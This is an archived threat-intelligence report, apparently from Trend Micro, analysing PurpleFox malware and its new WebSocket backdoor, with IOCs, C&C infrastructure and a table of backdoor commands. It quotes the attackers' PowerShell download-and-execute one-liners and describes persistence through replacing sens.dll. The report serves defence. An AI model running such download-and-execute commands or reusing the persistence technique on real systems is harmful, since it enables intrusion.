{
    "id": "a521cc17-1c41-4df1-a30a-7f461cee525a",
    "created_at": "2022-10-25T16:48:24.723648Z",
    "updated_at": "2025-03-27T02:05:50.294064Z",
    "deleted_at": null,
    "sha1_hash": "dfa5c713e19a1e537fb24955675433f4c22b3b05",
    "title": "",
    "authors": "",
    "file_creation_date": "2021-10-20T05:48:35Z",
    "file_modification_date": "2021-10-20T05:48:35Z",
    "file_size": 1542558,
    "plain_text": "# PurpleFox Adds New Backdoor That Uses WebSockets\n\n**[trendmicro.com/en_us/research/21/j/purplefox-adds-new-backdoor-that-uses-websockets.html](https://www.trendmicro.com/en_us/research/21/j/purplefox-adds-new-backdoor-that-uses-websockets.html)**\n\nOctober 19, 2021\n\n[In September 2021, the Trend Micro Managed XDR (MDR) team looked into suspicious](https://www.trendmicro.com/en_us/business/products/detection-response/managed-xdr-mdr.html)\nactivity related to a PurpleFox operator. Our findings led us to investigate an updated\nPurpleFox arsenal, which included an added vulnerability (CVE-2021-1732) and optimized\nrootkit capabilities leveraged in their attacks.\n\nWe also found a new backdoor written in .NET implanted during the intrusion, which we\nbelieve is highly associated with PurpleFox. This backdoor, which we call FoxSocket,\nleverages WebSockets to communicate with its command-and-control (C&C) servers,\nresulting in a more robust and secure means of communication compared to regular HTTP\ntraffic.\n\nWe believe that this particular threat is currently being aimed at users in the Middle East. We\nfirst encountered this threat via customers in the region. We are currently investigating if it\nhas been found in other parts of the world.\n\nIn this blog, we describe some of the observed modifications for the initial PurpleFox\npayloads, alongside the new implanted .NET backdoor and the C2 infrastructure serving its\nfunctionality.\n\n**PurpleFox Capabilities and Technical Analysis**\n\n**_PowerShell_**\n\nThe activity starts with either of the following PowerShell commands being executed:\n\n\"cmd.exe\" /c powershell -nop -exec bypass -c \"IEX (New-Object\nNet.WebClient).DownloadString('hxxp[[:]]//103.228.112.246[[:]]17881/57BC9B7E.Png');MsiMake\nhxxp[[:]]//103.228.112.246[[:]]17881/0CFA042F.Png\"\n\"cmd.exe\" /c powershell -nop -exec bypass -c \"IEX (New-Object\nNet.WebClient).DownloadString('http[:]//117.187.136.141[:]13405/57BC9B7E.Png');MsiMake\nhttp[:]//117.187.136.141[:]13405/0CFA042F.Png\"\n\nThese commands download a malicious payload from the specified URLs, which are hosted\non multiple compromised servers. These servers are part of the PurpleFox botnet, with most\nof these located in China:\n\n**Country** **Server count**\n\nChina 345\n\nIndia 34\n\nBrazil 29\n\nUnited States 26\n\n|Country|Server count|\n|---|---|\n|China|345|\n|India|34|\n|Brazil|29|\n\n\n-----\n\n|Others|113|\n|---|---|\n\n\nTable 1. Location of PurpleFox\n\nservers\n\nThe fetched payload is a long script consisting of three components:\n\nThe script targets 64-bit architecture systems. It starts by checking the Windows version and\napplied hotfixes for the vulnerabilities it is targeting.\n\nWindows 7/Windows Server 2008\n\nCVE-2020-1054 (KB4556836, KB4556843)\nCVE-2019-0808 (KB4489878, KB4489885, KB2882822)\nWindows 8/Windows Server 2012\n\nCVE-2019-1458 (KB4530702, KB4530730)\nWindows 10/Windows Server 2019\n\nCVE-2021-1732 (KB4601354, KB4601345, KB4601315, KB4601319)\n\nAfter selecting the appropriate vulnerability, it uses the PowerSploit module to reflectively\nload the embedded exploit bundle binary with the target vulnerability and an MSI command\nas arguments. As a failover, it uses the Tater module to launch the MSI command.\n\nThe goal is to install the MSI package as an admin without any user interaction.\n\n**_MSI Package_**\n\nThe MSI package starts by removing the following registry keys, which are old Purple Fox\ninstallations if any are present:\n\nHKLM\\SYSTEM\\CurrentControlSet\\Services\\{ac00-ac10}\n\nIt then installs the components (dbcode21mk.log and setupact64.log) of the Purple Fox\nbackdoor to Windows directory. Afterward, it sets two registry values under the key\n“HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager”:\n\nAllowProtectedRenames to 0x1, and\nPendingFileRenameOperations to the following:\n\n\\??\\C:\\Windows\\AppPatch\\Acpsens.dll\n\n\\??\\C:\\Windows\\system32\\sens.dll\n\n\\??\\C:\\Windows\\AppPatch\\Acpsens.dll\n\n\\??\\C:\\Windows\\system32\\sens.dll\n\n\\??\\C:\\Windows\\setupact64.log\n\\??\\C:\\Windows\\system32\\sens.dll\n\n\n-----\n\nThese commands move sens.dll to C:\\Windows\\AppPatch\\Acpsens.dll and replace it with\nthe installed file setupact64.log.\n\nThe MSI package then runs a .vbs script that creates a Windows firewall rule to block\nincoming connections on ports 135, 139, and 445. As a final step, the system is restarted to\nallow PendingFileRenameOperations to take place, replacing sens.dll, which will make the\nmalware run as the System Event Notification Service (SENS).\n\n**_PurpleFox Backdoor_**\n\nThe installed malware is a .dll file protected with VMProtect. Using the other data file\ninstalled by the MSI package, it unpacks and manually loads different DLLs for its\nfunctionality. It also has a rootkit driver that is also unpacked from the data file and is used\nto hide its files, registry keys, and processes. The sample starts by copying itself to another\nfile and installing a new service, then restoring the original sens.dll file. Afterward, it loads\nthe driver to hide its files and registries and then spawns and injects a sequence of a 32-bit\nprocess to inject its code modules into, as they are 32-bit DLLs.\n\nFigure 1. PurpleFox installation process\n\nWebSocket Backdoor\n\n**_Initial Delivery_**\n\n\n-----\n\nThe initial activity for retrieving this backdoor was captured three days after the previous\nPurpleFox intrusion attempts on the same compromised server. The Trend Micro Vision\nOne™ platform flagged the following suspicious PowerShell commands:\n\n\"cmd.exe\" /c powershell -c \"iex((new-object\nNet.WebClient).DownloadString('hxxp[:]//185.112.144.245/a/1'))\"\n\"cmd.exe\" /c powershell -c \"iex((new-object\nNet.WebClient).DownloadString('hxxp[:]//185.112.144.245/a/2'))\"\n\"cmd.exe\" /c powershell -c \"iex((new-object\nNet.WebClient).DownloadString('hxxp[:]//185.112.144.245/a/3'))\"\n\"cmd.exe\" /c powershell -c \"iex((new-object\nNet.WebClient).DownloadString('hxxp[:]//185.112.144.245/a/4'))\"\n\"cmd.exe\" /c powershell -c \"iex((new-object\nNet.WebClient).DownloadString('hxxp[:]//185.112.144.245/a/5'))\"\n\"cmd.exe\" /c powershell -c \"iex((new-object\nNet.WebClient).DownloadString('hxxp[:]//185.112.144.245/a/8'))\"\n\"cmd.exe\" /c powershell -c \"iex((new-object\nNet.WebClient).DownloadString('hxxp[:]//185.112.144.245/a/9'))\"\n\nFigure 2. Trend Micro Vision One alert for PowerShell commands\n\nWe analyzed the payload hosted on the URLs, which were variations of\n185[.]112.144.245/a/[1-9], and all were found to be serving two variants of another\nPowerShell script that acts as the main downloader for the .NET backdoor.\n\n\n-----\n\nFigure 3. Contents of payload\n\nThe difference between the two observed PowerShell scripts were in Base64-encoded data\nthat was passed as an argument to the .NET sample downloaded from\n_185[.]112[.]144[.]45/a/data and finally invoked with this configuration parameter. We found_\ntwo different configuration parameters used: We observed the first one on August 26 and the\nsecond one with more domains embedded on August 30. The decoded Base64-encoded\nconfiguration parameters are shown in the following figures:\n\nFigure 4. August 26 configuration\n\nFigure 5. August 30 configuration\n\nThese configuration parameters will be used by the .NET initialization routines to pick a C&C\nserver and initialize cryptographic functions for the C&C channel. Aside from the\nconfiguration, the payload itself is retrieved from 185.112.144[.]45/a/data.We also found\nsome old variants that date back to June 22 that have fewer capabilities than the more recent\nvariants.\n\n\n-----\n\nDuring the earliest iterations for deploying this backdoor, aligning with the creation data of\nthe malicious domain advb9fyxlf2v[.]com, the configuration parameters had a minimal\nnumber of subdomains to contact the C&C servers compared to the recent one.\n\nFigure 6. Backdoor configuration\n\n.NET Backdoor Obfuscation\n\nLet us start the analysis with the backdoor dropped on the SQL server. When decompiled, it\nwill output some obfuscated symbols, although most of these can’t be restored to the original.\nMerely making them to be human-readable is sufficient for basic static analysis. Sometimes,\nsome of the original names can be restored.\n\nOne notable characteristic we rarely see in\nmalware is leveraging WebSocket communication\nto the C&C servers for an efficient bidirectional\nchannel between the infected client and the\nserver.\n\nWebSocket is a communication technology that\nsupports streams of data to be exchanged between\na client and a server over just a single TCP session.\nThis is different from traditional request or\nresponse protocols like HTTP. This gives the\n\nFigure 7. Cleaned classes and method names\n\nthreat actor a more covert alternative to HTTP\nrequests and responses traffic, which creates an opportunity for a more silent exfiltration\nwith less likelihood of being detected.\n\n\n-----\n\nFigure 8. Traditional (left) and WebSocket techniques (right)\n\nIt initializes a WebSocket communication with its C&C server and keeps it open by sending\nkeepalive messages to maintain the TCP connection. Once this is established, a series of\nbidirectional messages will be exchanged between the infected machine and the selected C&C\nserver to negotiate a session encryption key.\n\nFigure 9. TCP/IP exchanges between client and server\n\nThe execution starts by initializing the WebSocket and registering four callback functions as\nhandlers for the WebSocket events.\n\n\n-----\n\nFigure 10. Function for registering callback functions\n\nOne of the relevant callbacks is onOpen, which will initialize the C&C channel encryption\nparameters once the WebSocket object is fired for the first time. As shown in the next section,\nthis is mainly for implementing the first Diffie-Hellman (DH) key exchange message with the\nC&C server. On the other side, the onReceive handler will process and dispatch all the\ncommands received from the server after a secure communication channel is established and\nwhen the session encryption key is updated.\n\nKey Negotiations\n\nThe first key exchange with the C&C server is carried out by the onOpen callback registered\nfunction, as seen in Figure 11.\n\nFigure 11. onOpen function\n\nIt initializes the EC DH object with some parameters to start the shared secret key\nnegotiation. The ECDiffieHellmanKeyDerivationFunction property is then set to\n**Hash. This property is for specifying the key derivation function that the**\n**ECDiffieHellmanCng class will use to convert secret agreements into key material, so a**\n**hash algorithm is used to generate key material (instead of HMAC or TLS).**\n\nAfterward, the client will try to send the property PublicKey, which will be used at the C&C\nside on another ECDiffieHellmanCng object to generate a shared secret agreement.\nEventually, this data will be sent on the WebSocket as the first key exchange message.\nHowever, instead of sending it in cleartext, the client deploys a symmetric AES encryption for\nany communication over the WebSocket for the first exchange, as no shared secret is\nestablished yet, and the AES encryption will generate a default key for this first exchange.\n\n\n-----\n\nFigures 12-13. Function and code for the AES encryption key\n\nThis will result in the key negotiation message being encrypted with AES using the shown\nparameters and a dummy key generated (111….11)[32] named byte_0 in the following\ndebugging session with the actual AES cipher text with a fixed length of 176 bytes.\n\nFigure 14. Structure of key exchange message\n\nThe 176 encrypted bytes are the actual data that will be sent over the WebSocket, which\nmarks the end of the first key exchange message.\n\nSecond Exchange (C&C to Victim)\n\nThe second key exchange message is sent from the server to the client that will be handled by\nthe onReceive function. The execution is invoked by the message handler.\n\n\n-----\n\nFigure 15. Invoking the onReceive function\n\nThis AES-encrypted second exchange has a fixed length of 304 bytes.\n\nFigure 16. Contents of incoming message\n\nIt then checks if this incoming message is related to the control plane key establishment or\njust a normal data command.\n\nIf it is related to the former, the first step is to decrypt the symmetric encryption on the C2\nchannel then finalize the shared secret generation by handing the execution to ECDH\nderivation function method_7.\n\nFigure 17. Handoff to method_7 function\n\n\n-----\n\nThe client will verify the signed message by loading the RSA public key loaded from the\nconfiguration payload shown in the previous section. If the signature is verified correctly, key\nmaterial will be derived from the DH exchange and will be saved as the permanent symmetric\nAES encryption key (Symmetric_AES_key variable) that will be used as long as the\nWebSocket channel is active.\n\nFigure 18. method_7 function\n\nThird Exchange (Victim to C&C)\n\nOnce an efficient encrypted session is established over the WebSocket, the client will\nfingerprint the machine by extracting specific data (including the username, machine name,\nlocal IP, MAC address, and Windows version) and will relay such data over the secure\nchannel to get the victim profiled at the server side, which is the final exchange before the\nWebSocket channel is fully established. It will then listen for further commands, which will\nbe covered in the next section.\n\nAs the fingerprinting data collected will be different from one execution environment to\nanother, this message will vary in length. From our lab analysis, it was 240 bytes with the\nnewly generated shared secret key.\n\nFigure 19. Newly generated secret key\n\n\n-----\n\nAs far as the WebSocket is maintained with the keepalive messages shown earlier, the\noperators can signal any command to be executed, so what happens next mainly depends on\nthe targeting and the actual motivation of the operator.\n\nWebSocket Commands\n\nIn this section, we cover some of the observed commands sent from the server. There are\nsome minor differences between variants across them with regard to the command numbers\nand the supported functionality.\n\nAll the handling of commands is implemented in the main dispatch routine (except for\ncommand 160, which is used for key negotiation or renegotiation).\n\n|Command code|Functionality|\n|---|---|\n|20|Sends the current date on the victim machine|\n|30|Leaks DriveInfo.GetDrives() results info for all the drives|\n|40|Leaks DirectoryInfo() results info for a specific directory|\n|50|FileInfo()results info for a specific file|\n|60|Recursive directory search|\n|70|Executes WMI queries - ManagementObjectSearcher()|\n|80|Closes the WebSocket Session|\n|90|Exits the process|\n|100|Spawns a new process|\n|110|Downloads more data from a specific URL to the victim machine|\n|120|DNS lookup from the victim machine|\n|130|Leaks specific file contents from the victim machine|\n|140|Writes new content to a specific location|\n|150|Downloads data then write to a specific file|\n|160|Renegotiates session key for symmetric encryption|\n|180|Gets current process ID/Name|\n|210|Returns the configuration parameter for the backdoor|\n|220|Kills the process then start the new process with a different config|\n|230|Kills specific process with PID|\n|240|Queries internal backdoor object properties|\n\n\n-----\n\n|260|Leaks hashes of some specific files requested|\n|---|---|\n|270|Kills list of PIDs|\n|280|Deletes list of files/directories requested|\n|290|Moves list of files/directories to another location|\n|300|Creates new directory to a specific location|\n\n\nTable 2. List of commands\n\nWebSocket C&C Infrastructure\n\nAt the time of this writing, there were several active C&C servers controlling the WebSocket\nclients. By profiling the infected targets and interacting through different commands sent, we\nlisted the observed IP addresses and the registered domains found in the PowerShell\ndownloaders and the backdoor configuration parameters.\n\n**IP address** **Description** **ASN** **Notable activity**\n\n185.112.144.245 (Hosting PS payloads, AS 44925 ( 1984 Iraq, Saudi Arabia,\n/a/[1-9]) ehf ) Turkey, UAE\n\n(Hosting .Net Payload,\n/a/data)\n\n185.112.147.50 C&C server Turkey, US, UAE\n\n185.112.144.101 Turkey\n\n93.95.226.157 US\n\n93.95.228.163 US\n\n93.95.227.183 \n93.95.227.169 UAE\n\n93.95.227.179 \n185.112.146.72 Potential C&C server \n185.112.146.83 \nTable 3. WebSocket C&C serversIP address Description ASN Notable activity\n\nThe backdoor picks one subdomain randomly from the configuration data and tries to\nconnect via WebSockets. If it fails to connect on port 12345, it will try to resolve another\nsubdomain.\n\n|IP address|Description|ASN|Notable activity|\n|---|---|---|---|\n|185.112.144.245|(Hosting PS payloads, /a/[1-9]) (Hosting .Net Payload, /a/data)|AS 44925 ( 1984 ehf )|Iraq, Saudi Arabia, Turkey, UAE|\n|185.112.147.50|C&C server||Turkey, US, UAE|\n|185.112.144.101|||Turkey|\n|93.95.226.157|||US|\n|93.95.228.163|||US|\n|93.95.227.183|||-|\n|93.95.227.169|||UAE|\n|93.95.227.179|||-|\n|185.112.146.72|Potential C&C server||-|\n|185.112.146.83|||-|\n\n\n-----\n\nFigure 20. Random C&C servers\n\nThe main domain advb9fyxlf2v[.]com used by these servers — registered on June 17, 2021,\njust within days of the first observed variant — is mainly for load balancing across the\nmultiple active servers.\n\nConclusion\n\nThe rootkit capabilities of PurpleFox make it more capable of carrying out its objectives in a\nstealthier manner. They allow PurpleFox to persist on affected systems as well as deliver\nfurther payloads to affected systems. We are still monitoring these new variants and their\ndropped payloads. The new .NET WebSocket backdoor (called FoxSocket, which we detect as\nBackdoor.MSIL.PURPLEFOX.AA) is being closely monitored to discover any more\ninformation about this threat actor’s intentions and objectives.\n\nTrend Micro Solutions and Indicators of Compromise\n\n[The capabilities of the Trend Micro Vision One platform made both the detection of this](https://www.trendmicro.com/en_us/business/products/detection-response.html)\nattack and our investigation into it possible. We took into account metrics from the network\nand endpoints that would indicate potential attempts of exploitation. The Trend Micro Vision\nOne Workbench shows a holistic view of the activities that are observed in a user’s\nenvironment by highlighting important attributes related to the attack.\n\n[Trend Micro Managed XDR offers expert threat monitoring, correlation, and analysis from](https://www.trendmicro.com/en_us/business/products/detection-response/managed-xdr-mdr.html)\nexperienced cybersecurity industry veterans, providing 24/7 service that allows organizations\nto have one single source of detection, analysis, and response. This service is enhanced by\nsolutions that combine AI and Trend Micro’s wealth of global threat intelligence.\n\n[All IOCs related to this attack can be found in this separate file.](https://www.trendmicro.com/content/dam/trendmicro/global/en/research/21/j/purplefox-backdoor-uses-websockets/iocs-purplefox.txt)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "5d2b9e7f-cf43-4b54-ba18-065aa3003611",
            "created_at": "2022-10-25T16:06:24.199525Z",
            "updated_at": "2022-10-25T16:06:24.199525Z",
            "deleted_at": null,
            "name": "CyberMonitor",
            "url": "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections",
            "description": "APT & Cybercriminals Campaign Collection",
            "reports": null
        }
    ],
    "references": [
        "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections/raw/master/2021/2021.10.19.PurpleFox/PurpleFox%20Adds%20New%20Backdoor%20That%20Uses%20WebSockets.pdf"
    ],
    "report_names": [
        "PurpleFox Adds New Backdoor That Uses WebSockets"
    ],
    "threat_actors": [],
    "ts_created_at": 1666716504,
    "ts_updated_at": 1743041150,
    "ts_creation_date": 1634708915,
    "ts_modification_date": 1634708915,
    "files": {
        "pdf": "https://archive.orkl.eu/dfa5c713e19a1e537fb24955675433f4c22b3b05.pdf",
        "text": "https://archive.orkl.eu/dfa5c713e19a1e537fb24955675433f4c22b3b05.txt",
        "img": "https://archive.orkl.eu/dfa5c713e19a1e537fb24955675433f4c22b3b05.jpg"
    }
}